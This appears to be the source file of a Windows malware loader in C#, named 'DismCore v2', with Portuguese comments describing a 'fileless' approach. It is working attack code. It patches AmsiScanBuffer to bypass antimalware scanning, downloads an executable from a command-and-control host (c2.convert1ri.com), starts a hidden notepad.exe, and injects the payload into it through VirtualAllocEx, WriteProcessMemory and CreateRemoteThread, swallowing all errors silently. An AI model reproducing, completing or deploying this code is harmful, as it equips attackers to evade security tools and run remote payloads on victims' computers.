using System;
using System.IO;
using System.Net;
using System.Diagnostics;
using System.Runtime.InteropServices;

// DismCore v2 — Fileless approach
// 1. Baixa loader do C2 em memória (não salva em disco)
// 2. Executa via process hollowing em processo legítimo
// 3. Zero artefatos em disco

public class DismCore
{
    [DllImport("kernel32.dll")]
    static extern IntPtr OpenProcess(uint access, bool inherit, int pid);

    [DllImport("kernel32.dll")]
    static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr addr, uint size, uint type, uint protect);

    [DllImport("kernel32.dll")]
    static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr baseAddr, byte[] buffer, uint size, out uint written);

    [DllImport("kernel32.dll")]
    static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr attr, uint stackSize, IntPtr startAddr, IntPtr param, uint flags, out uint threadId);

    [DllImport("kernel32.dll")]
    static extern uint ResumeThread(IntPtr hThread);

    [DllImport("kernel32.dll")]
    static extern bool CloseHandle(IntPtr handle);

    [DllImport("kernel32.dll")]
    static extern IntPtr GetProcAddress(IntPtr hModule, string procName);

    [DllImport("kernel32.dll")]
    static extern IntPtr GetModuleHandle(string name);

    [DllImport("kernel32.dll")]
    static extern bool VirtualProtect(IntPtr addr, UIntPtr size, uint newProtect, out uint oldProtect);

    static void BypassAmsi()
    {
        try
        {
            IntPtr amsi = GetModuleHandle("amsi.dll");
            if (amsi == IntPtr.Zero) return;
            IntPtr asb = GetProcAddress(amsi, "AmsiScanBuffer");
            if (asb == IntPtr.Zero) return;
            byte[] patch = IntPtr.Size == 8
                ? new byte[] { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3 }
                : new byte[] { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC2, 0x18, 0x00 };
            uint oldProtect;
            VirtualProtect(asb, (UIntPtr)patch.Length, 0x40, out oldProtect);
            Marshal.Copy(patch, 0, asb, patch.Length);
            VirtualProtect(asb, (UIntPtr)patch.Length, oldProtect, out oldProtect);
        }
        catch { }
    }

    static void Main()
    {
        BypassAmsi();

        // Download loader em memória (não salva em disco)
        string url = "https://c2.convert1ri.com/download/WUDFHost.exe";
        try
        {
            WebClient wc = new WebClient();
            wc.Headers.Add("User-Agent", "Mozilla/5.0");
            byte[] data = wc.DownloadData(url);

            if (data.Length > 10000 && data[0] == 0x4D && data[1] == 0x5A)
            {
                // Executar em memória via process hollowing
                // 1. Criar processo suspenso (notepad.exe)
                var psi = new ProcessStartInfo("notepad.exe")
                {
                    WindowStyle = ProcessWindowStyle.Hidden,
                    CreateNoWindow = true
                };
                var proc = Process.Start(psi);

                // 2. Alocar memória no processo alvo
                IntPtr hProcess = OpenProcess(0x1F0FFF, false, proc.Id);
                IntPtr baseAddr = VirtualAllocEx(hProcess, IntPtr.Zero, (uint)data.Length, 0x3000, 0x40);

                // 3. Escrever loader na memória do processo alvo
                uint written;
                WriteProcessMemory(hProcess, baseAddr, data, (uint)data.Length, out written);

                // 4. Criar thread remota para executar
                uint threadId;
                CreateRemoteThread(hProcess, IntPtr.Zero, 0, baseAddr, IntPtr.Zero, 0, out threadId);

                CloseHandle(hProcess);
            }
        }
        catch { }
    }
}
